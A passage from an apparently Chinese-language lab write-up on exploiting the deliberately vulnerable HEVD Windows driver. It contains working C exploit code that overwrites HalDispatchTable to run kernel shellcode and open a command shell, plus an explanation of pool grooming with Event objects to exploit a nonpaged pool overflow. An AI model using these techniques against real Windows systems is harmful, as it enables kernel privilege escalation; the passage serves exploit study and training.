</span></span><span class="line"><span class="cl">    <span class="n">WRITE_WHAT_WHERE</span> <span class="n">exploit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">lpbReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">.</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">where</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">.</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">what</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Write at 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">where</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Write with 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to trigger...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Write_What_Where</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;</span><span class="n">exploit</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;</span><span class="n">lpbReturn</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to trigger...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Get HANDLE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">interVal</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get HANDLE!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// system(&#34;pause&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">DWORD32</span> <span class="n">Hal_hook_address</span> <span class="o">=</span> <span class="nf">GetHalOffset_4</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]HalDispatchTable+0x4 is 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Hal_hook_address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">Trigger_shellcode</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">Hal_hook_address</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ShellCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">NtQueryIntervalProfile_t</span> <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtQueryIntervalProfile_t</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="nf">LoadLibraryA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">),</span> <span class="s">&#34;NtQueryIntervalProfile&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]NtQueryIntervalProfile address is 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">NtQueryIntervalProfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">interVal</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to Create cmd...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="5pooloverflow-triggerbufferoverflownonpagedpool待完善" class="heading-element">
  <a href="#5pooloverflow-triggerbufferoverflownonpagedpool%e5%be%85%e5%ae%8c%e5%96%84" class="heading-mark"></a>5.PoolOverflow-TriggerBufferOverflowNonPagedPool(待完善)</h2><p>本部分为非换页池溢出漏洞分析利用</p>
<h3 id="前置知识点待完成" class="heading-element">
  <a href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86%e7%82%b9%e5%be%85%e5%ae%8c%e6%88%90" class="heading-mark"></a>前置知识点（待完成）</h3><p>UAF：简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p><strong>一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
<h4 id="nonpagedpool" class="heading-element">
  <a href="#nonpagedpool" class="heading-mark"></a>NonPagedPool</h4><p>用户空间是从“堆(Heap)”分配缓冲区的，内核中也有类似的机制，但是不叫“堆”而称为“池(Pool)”。不过二者有着重要的区别。</p>
<p>首先，用户空间的堆是属于进程的；而内核中的池则是全局的，属于整个系统。堆所占的是虚存空间，堆的扩充基本上体现在作为后备存储的页面倒换文件的扩充，而不必同时占用那么多的物理页面。</p>
<p>而内核中的池则分成两种：</p>
<ul>
<li>一种是所占页面不可倒换的，每个页面不管其是否受到访问都真金白银地占着物理页面，要求这种池的大小可扩充显然不现实。</li>
<li>另一种是所占页面可以倒换的，这种池的大小倒是可以扩充，因为(已分配而）暂时不受访问的（虚存）页面可以被倒换到作为后备的页面倒换文件中。</li>
</ul>
<p>换页内存池和非换页内存池则是提供给系统内核模块和设备驱动程序使用的。在换页内存池中分配的内存有可能在物理内存紧缺的情况下被换出到外存中;而非换页内存池中分配的内存总是处于物理内存中。</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/921642_AWSZ3WP3XJW7EN8.jpg" alt="img" srcset="/posts/2023-8-hevd/921642_AWSZ3WP3XJW7EN8.jpg?size=small, /posts/2023-8-hevd/921642_AWSZ3WP3XJW7EN8.jpg?size=medium 1.5x, /posts/2023-8-hevd/921642_AWSZ3WP3XJW7EN8.jpg?size=large 2x" data-title="img" style="--width: 809px;--aspect-ratio: 809 / 236;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>windows内核中定义了许多不同的池：</p>
<p>实际使用的基本上就是<code>NonPagedPool</code> 和 <code>PagedPool</code> 两个。</p>
<div class="highlight" id="id-58"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_POOL_TYPE</span>
</span></span><span class="line"><span class="cl"><span class="n">ntdll</span><span class="o">!</span><span class="n">_POOL_TYPE</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPool</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n0</span>
</span></span><span class="line"><span class="cl">   <span class="n">PagedPool</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n1</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolMustSucceed</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n2</span>
</span></span><span class="line"><span class="cl">   <span class="n">DontUseThisType</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n3</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolCacheAligned</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n4</span>
</span></span><span class="line"><span class="cl">   <span class="n">PagedPoolCacheAligned</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n5</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolCacheAlignedMustS</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n6</span>
</span></span><span class="line"><span class="cl">   <span class="n">MaxPoolType</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n7</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n32</span>
</span></span><span class="line"><span class="cl">   <span class="n">PagedPoolSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n33</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolMustSucceedSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n34</span>
</span></span><span class="line"><span class="cl">   <span class="n">DontUseThisTypeSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n35</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolCacheAlignedSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n36</span>
</span></span><span class="line"><span class="cl">   <span class="n">PagedPoolCacheAlignedSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n37</span>
</span></span><span class="line"><span class="cl">   <span class="n">NonPagedPoolCacheAlignedMustSSession</span> <span class="o">=</span> <span class="mi">0</span><span class="n">n38</span></span></span></code></pre></div><p><code>MilnitializeNonPagedPool</code>函数确定非换页内存池的起始和结束物理页面帧<code>MiStartOfInitialPoolFrame</code> 和 <code>MiEndOfInitialPoolFrame</code>,</p>
<p>一旦非换页内存池的结构已建立，接下来系统代码可以通过 <code>MiAllocatePoolPages</code> 和<code>MiFreePoolPages</code> 函数来申请和归还页面。</p>
<p>Windows充分利用这些页面自身的内存来构建起一组空闲页面链表，每个页面都是一个<code>MMFREE_POOL_ENTRY</code>结构，如图所示。<code>MiInitializeNonPagedPool</code>函数已经把数组<code>MmNonPagedPoolFreeListHead</code>初始化成只包含一个个完整的空闲内存块，该内存块包括所有的非换页页面。</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/921642_PH3NWQD64R2TXXQ.jpg" alt="img" srcset="/posts/2023-8-hevd/921642_PH3NWQD64R2TXXQ.jpg?size=small, /posts/2023-8-hevd/921642_PH3NWQD64R2TXXQ.jpg?size=medium 1.5x, /posts/2023-8-hevd/921642_PH3NWQD64R2TXXQ.jpg?size=large 2x" data-title="img" style="--width: 887px;--aspect-ratio: 887 / 866;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>在非换页内存池的结构中，每个空闲链表中的每个节点包含1、2、3、4或4个以上的页面，在同一个节点上的页面其虚拟地址空间是连续的。第一个页面的List域构成了链表结构，Size域指明了这个节点所包含的页面数量，Owner域指向自己;后续页面的List和 Size域没有使用，但Owner域很重要，它指向第一个页面。</p>
<p>非换页内存池中的页面回收是通过MiFreePoolPages函数来完成的,</p>
<p>内核和设备驱动程序使用非分页池来存储系统无法处理页面错误时可能访问的数据，非页面缓冲池总是保持在物理内存中，非页面缓冲池虚拟内存被分配物理内存。存储在非分页池中的通用系统数据结构包括表示进程和线程的内核和对象，互斥对象，信号灯和事件等同步对象，表示为文件对象的文件引用以及I / O请求包（IRP）代表I / O操作</p>
<h4 id="池风水" class="heading-element">
  <a href="#%e6%b1%a0%e9%a3%8e%e6%b0%b4" class="heading-mark"></a>池风水</h4><p>HEVD 驱动, 有漏洞的用户缓冲区被分配在非分页池，所以需要找到一种方法来修改非分页池。</p>
<blockquote>
<p>内核池空闲池块保存在一个链表结构里，当进行申请该池的内存的时候，会从链表里找到合适大小的池块进行分配，如果找不到，则会寻找相近大小的池块进行切割然后再分配；</p>
<p>当空闲链表里有位置相邻的空闲池块，则会进行合并操作，合并成一个大的池块</p>
</blockquote>
<p>由于池块分布是无序的，但我们可以利用<code>CreateEventA</code>分配池块来控制池块分布，每个<code>event</code>块大小为<code>0x40</code>。</p>
<p>Windows 提供了一种<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682655%28v=vs.85%29.aspx"target="_blank" rel="external nofollow noopener noreferrer">Event</a>对象, 该对象存储在非分页池中，可以使用<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396%28v=vs.85%29.aspx"target="_blank" rel="external nofollow noopener noreferrer">CreateEvent</a> API 来创建：</p>
<div class="highlight" id="id-59"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateEvent</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpEventAttributes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bManualReset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bInitialState</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span> <span class="n">LPCTSTR</span>               <span class="n">lpName</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div><p>在这里我们需要用这个API创建两个足够大的<code>Event</code>对象数组，然后通过使用<a href="https://bbs.kanxue.com/closehandle"target="_blank" rel="external nofollow noopener noreferrer">CloseHandle</a> API 释放某些<code>Event</code> 对象，从而在分配的池块中造成空隙，经合并形成更大的空闲块:</p>
<div class="highlight" id="id-60"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">CloseHandle</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">hObject</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div><p>通过大量申请Event对象，然后通过CloseHandle释放一部分Event对象留出合适的空间给用户缓冲区，那么用户缓冲区很可能就会出现在我们挖出的空缺位置上，并且同时紧紧挨着一个Event对象，也就是说，可以固定让用户缓冲区后面紧挨着一个Event对象</p>
<p>这里需要创建两个足够大的Event对象数组，一个用来消耗小尺寸空闲内存块，一个用来挖出空缺提供给用户缓冲区</p>
<p>在空出的空闲块中，我们将有漏洞的用户缓冲区插入，图示如下</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814023410736.png" alt="image-20230814023410736" srcset="/posts/2023-8-hevd/image-20230814023410736.png?size=small, /posts/2023-8-hevd/image-20230814023410736.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814023410736.png?size=large 2x" data-title="image-20230814023410736" style="--width: 1066px;--aspect-ratio: 1066 / 605;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="利用原理event对象结构" class="heading-element">
  <a href="#%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86event%e5%af%b9%e8%b1%a1%e7%bb%93%e6%9e%84" class="heading-mark"></a>利用原理&amp;Event对象结构</h3><blockquote>
<p>控制缓冲区紧挨着一个Event对象，通过覆盖伪造一个<code>OBJECT_TYPE</code>头，覆盖指向<code>OBJECT_TYPE_INITIALIZER</code>中的一个过程的指针，通过执行该过程从而执行shellcode</p>
</blockquote>
<h3 id="漏洞分析" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark"></a>漏洞分析</h3><p>首先用<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-exallocatepoolwithtag"target="_blank" rel="external nofollow noopener noreferrer"><code>ExAllocatePoolWithTag</code></a>函数分配了一块非分页内存池，然后将一些信息打印出来，又验证缓冲区是否驻留在用户模式下，然后用<a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019"target="_blank" rel="external nofollow noopener noreferrer"><code>memcpy</code></a>函数将<code>UserBuffer</code>拷贝到<code>KernelBuffer</code>，同样的拷贝，同样的没有控制Size的大小，只是一个是栈溢出一个是池溢出</p>
<div class="highlight" id="id-61"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerBufferOverflowNonPagedPool</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">PVOID</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// ebx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Allocating Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="mh">0x1F8u</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;NonPagedPool&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">504</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mh">0x1F8u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">504</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Buffer Overflow in NonPagedPool</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Freeing Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xC0000017</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>测试代码：</p>
